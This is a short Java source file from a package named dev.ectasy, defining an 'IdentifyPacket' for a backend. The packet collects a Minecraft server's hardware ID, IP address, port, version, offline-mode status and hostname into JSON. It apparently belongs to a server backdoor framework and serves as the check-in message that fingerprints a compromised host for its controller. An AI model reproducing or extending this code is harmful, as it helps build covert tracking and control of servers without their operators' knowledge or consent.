package dev.ectasy.impl.packets.backend;

import dev.ectasy.api.packets.backend.BackendPacket;
import dev.ectasy.api.packets.backend.BackendPacketInfo;
import dev.ectasy.api.utils.HWID;
import org.bukkit.Bukkit;
import org.json.JSONObject;

@BackendPacketInfo(
        id = 1
)
public class IdentifyPacket extends BackendPacket {

    @Override
    public JSONObject write(){
        JSONObject data = new JSONObject();

        data.put("type", 1);
        data.put("hwid", HWID.getServerId());
        data.put("ip", HWID.getIp());
        data.put("port", Bukkit.getPort());
        data.put("version", Bukkit.getVersion());
        data.put("cracked", !Bukkit.getOnlineMode());
        data.put("hostname", System.getenv("HOSTNAME"));


        return data;
    }

}
